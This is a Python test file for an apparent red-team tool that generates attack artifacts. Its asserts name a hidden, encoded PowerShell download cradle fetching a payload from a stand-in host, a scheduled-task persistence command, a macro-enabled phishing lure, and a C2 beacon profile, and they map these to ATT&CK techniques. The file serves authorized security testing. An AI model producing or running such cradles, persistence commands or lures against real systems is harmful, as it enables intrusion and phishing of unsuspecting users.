#!/usr/bin/env python3
"""Tests for the red-team operator artifact generator.

Run from the repo root: python3 -m pytest red-team/tests/test_operator.py
"""

import base64
import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
TOOLS = ROOT / "red-team" / "tools"


def _run(*args):
    cmd = [sys.executable, str(TOOLS / "operator_mod.py"), *args]
    proc = subprocess.run(cmd, capture_output=True, text=True, check=True)
    return proc.stdout, proc.stderr


def _extract_json(stdout):
    """Parse the JSON block printed after the authorization banner."""
    lines = stdout.splitlines()
    # JSON starts after the banner; find the first '{' line.
    start = next(i for i, line in enumerate(lines) if line.strip().startswith("{"))
    return json.loads("\n".join(lines[start:]))


def test_cradle_generates_expected_fields():
    out, _ = _run("cradle", "--url", "http://test.example/payload.ps1")
    data = _extract_json(out)
    assert data["technique"] == "T1059.001"
    assert "Invoke-WebRequest" in data["cleartext"]
    assert data["command_line"].startswith("powershell.exe -nop -w hidden -enc")
    # Verify the base64 is a valid UTF-16-LE encoded PowerShell command.
    decoded = base64.b64decode(data["encoded_command"]).decode("utf-16-le")
    assert decoded == data["cleartext"]


def test_persistence_generates_schtasks_command():
    out, _ = _run("persistence", "--name", "RedTeamTest")
    data = _extract_json(out)
    assert data["technique"] == "T1053.005"
    assert data["task_name"] == "RedTeamTest"
    assert "schtasks /create /tn RedTeamTest" in data["command_line"]
    assert "powershell.exe -nop -w hidden -enc" in data["command_line"]


def test_lure_generates_macro_template():
    out, _ = _run("lure", "--actor", "HelpDesk", "--pretext", "password reset")
    data = _extract_json(out)
    assert data["technique"] == "T1204.002"
    assert "HelpDesk" in data["subject"]
    assert data["filename"] == "password_reset.docm"
    assert "AutoOpen" in data["macro_placeholder"]
    assert "authorized" in data["macro_placeholder"].lower()


def test_c2_generates_beacon_profile():
    out, _ = _run("c2", "--domain", "beacon.example", "--jitter", "25")
    data = _extract_json(out)
    assert data["technique"] == "T1071"
    assert data["c2_host"] == "beacon.example"
    assert data["jitter_percent"] == 25
    assert data["beacon_interval_seconds"] == 60
    assert "example_beacon_url" in data


def test_cradle_writes_output_file(tmp_path):
    out_path = tmp_path / "cradle.json"
    _run("cradle", "--url", "http://test.example/payload.ps1", "-o", str(out_path))
    assert out_path.exists()
    data = json.loads(out_path.read_text())
    assert data["technique"] == "T1059.001"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
